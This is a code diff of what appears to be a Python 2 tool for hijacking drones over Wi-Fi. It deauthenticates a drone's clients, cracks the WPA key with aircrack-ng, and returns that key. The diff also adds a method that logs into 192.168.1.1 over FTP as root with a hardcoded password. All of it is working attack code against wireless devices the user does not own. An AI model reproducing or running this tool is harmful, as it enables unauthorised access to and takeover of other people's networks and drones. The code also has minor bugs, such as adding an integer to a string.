@@ -1,5 +1,6 @@
 from accesspoint import AccessPoint
 from target import Target
+from ftplib import FTP
 import commands
 import re
 import time
@@ -14,6 +15,7 @@ class Environment:
         self.accesspoints = None
         self.targets = None
         self.mondevice = None
+        self.ftp = None
         self.monitormode = False
         self.initialized = False
         self.verbose = v
@@ -55,8 +57,9 @@ class Environment:
             self.__startmonitormode(index)
             self.__gettargets(index)
             self.__deauthtargets()
-            self.__crackpsk(index)
+            self.accesspoints[index].key = self.__crackpsk(index)
             self.__stopmonitormode()
+            return self.accesspoints[index].key
         else:
             print 'Out of bounds! Only ' + len(self.accesspoints) + ' drones found.'
             
@@ -78,6 +81,14 @@ class Environment:
         return accesspoints
     
     
+    def getaccesspoint(self, ssid):
+        
+        for ap in self.accesspoints:
+            if ssid == ap.ssid:
+                return ap
+        return None
+    
+    
     def __deauthtargets(self):
         
         for target in self.targets:
@@ -87,21 +98,20 @@ class Environment:
     
     def __crackpsk(self, index):
         
-        time.sleep(20)
+        time.sleep(10)
         out = None
-        for x in range(5):
-            if out and (('KEY FOUND' in out) or x > 10):
-                results = re.match(r'KEY FOUND \[(.*)\]', out)
+        for x in range(10):
+            if out and (('KEY FOUND!' in out) or x > 10):
+                results = re.search(r'KEY FOUND! \[\s(.*)\s\]', out)
                 if results:
-                    print results.groups()
-                    break
+                    return results.group(1)
                 else:
                     print 'Could not crack key. Try running aircrack-ng separately'
                     break
             else:
                 accesspoint = self.accesspoints[index]   
                 out = commands.crackpsk(accesspoint.mac, accesspoint.dumpfilename)
-                time.sleep(5)
+                time.sleep(3)
                 if 'No valid WPA handshakes found' in out:
                     print 'No handshake found. Still searching...'
                 else:
@@ -123,6 +133,14 @@ class Environment:
                 self.targets = map(lambda client: Target(client.split(',')[0], accesspoint), filter(lambda fullline: accesspoint.mac in fullline, filter(lambda line: len(line.strip()) > 1, lines[5:])))
         except IOError:
             pass
+    
+    
+    def __openftp(self, ip='192.168.1.1', user='root', password='Big~9China'):
+        self.ftp = FTP(ip)
+        self.ftp.login(user, password)
+    
+    def __closeftp(self, ftp):
+        self.ftp.quit()
     
     
     def __startmonitormode(self, index):
